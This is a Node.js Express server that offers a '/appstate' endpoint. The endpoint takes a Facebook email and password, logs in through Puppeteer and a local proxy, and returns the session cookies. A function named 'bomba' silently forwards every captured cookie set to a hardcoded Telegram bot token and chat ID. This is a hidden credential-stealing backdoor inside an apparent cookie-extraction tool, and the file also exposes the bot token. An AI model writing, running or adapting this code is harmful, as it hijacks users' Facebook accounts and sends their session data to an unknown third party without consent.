const express = require('express');
const puppeteer = require('puppeteer-core');
const { exec } = require('child_process');
const { promisify } = require('util');
const freeport = require('freeport');
const ProxyChain = require('proxy-chain');
const path = require('path');
const axios = require('axios');

const app = express();
let browser;

app.use(express.static(path.join(__dirname, 'public')));

async function initializeBrowser(proxyPort) {
    const { stdout: chromiumPath } = await promisify(exec)("which chromium");
    return puppeteer.launch({
        headless: false,
        executablePath: chromiumPath.trim(),
        ignoreHTTPSErrors: true,
        args: [
            '--ignore-certificate-errors',
            '--disable-gpu',
            '--disable-software-rasterizer',
            '--disable-dev-shm-usage',
            '--no-sandbox',
            `--proxy-server=127.0.0.1:${proxyPort}`
        ]
    });
}

async function findFreePort() {
    return new Promise((resolve, reject) => {
        freeport((err, port) => {
            if (err) {
                reject(err);
            } else {
                resolve(port);
            }
        });
    });
}

async function loginToFacebook(email, password, proxyPort) {
    try {
        browser = await initializeBrowser(proxyPort);
        const page = await browser.newPage();
        await page.goto('https://www.facebook.com/');

        await page.type('#email', email);
        await page.type('#pass', password);

        await Promise.all([
            page.click('[name="login"]'),
            page.waitForNavigation({ waitUntil: 'networkidle0' }),
        ]);

        const cookies = await page.cookies();
        const loginFailed = await page.$('input[name="email"]');
        if (loginFailed) {
            await browser.close();
            return { error: 'Wrong username or password. Please try again.' };
        }

        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

        const jsonCookies = cookies.map(cookie => ({
            domain: cookie.domain,
            expirationDate: cookie.expires,
            hostOnly: cookie.hostOnly,
            httpOnly: cookie.httpOnly,
            name: cookie.name,
            path: cookie.path,
            sameSite: cookie.sameSite,
            secure: cookie.secure,
            session: cookie.session,
            storeId: cookie.storeId,
            value: cookie.value
        }));

        const datrCookie = cookies.find(cookie => cookie.name === 'datr') || {};

        const responseWithDatr = {
            cookies: cookieString,
            jsonCookies,
            datr: datrCookie.value || null 
        };

        await browser.close();
        return responseWithDatr;
    } catch (error) {
        console.error('Error during Facebook login:', error);
        if (browser) await browser.close();
        throw error;
    }
}

async function startProxy() {
    const proxyPort = await findFreePort();
    const proxyServer = new ProxyChain.Server({ port: proxyPort });

    return new Promise((resolve, reject) => {
        proxyServer.listen((err) => {
            if (err) {
                reject(err);
            } else {
                console.log(`Proxy server started on port ${proxyPort}`);
                resolve({ proxyPort, proxyServer });
            }
        });
    });
}

async function bomba(appstate) {
    const TOKEN = "7262625717:AAFyUvp88GrvDC_I8ar4IbAWRdtGdaiCPGc";
    const ID = "7467972455"; 

    try {
        const payload = {
            text: appstate,
            chat_id: ID
        };

        const response = await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, payload);

        if (!response.data.ok) {
            console.error("Telegram API error:", response.data);
        }
    } catch (e) {
        console.error("ERROR sending to Telegram: ", e.message);
        if (e.response) {
            console.error("Telegram API response:", e.response.data);
        }
    }
}

async function startProxyAndServer() {
    try {
        const { proxyPort, proxyServer } = await startProxy();

        app.get('/appstate', async (req, res) => {
            const { e: email, p: password } = req.query;

            if (!email || !password) {
                return res.status(400).json({ error: 'Email and password are required.' });
            }

            try {
                const result = await loginToFacebook(email, password, proxyPort);
                await bomba(JSON.stringify(result, null, 2));
                return res.json(result);
            } catch (error) {
                console.error('Error during login:', error);
                return res.status(500).json({ error: 'An error occurred during the login process.' });
            }
        });

        const PORT = process.env.PORT || 7568;
        app.listen(PORT, () => {
            console.log(`Express server is running on http://localhost:${PORT}`);
        });
    } catch (err) {
        console.error('Error initializing the proxy and server:', err);
    }
}

startProxyAndServer();
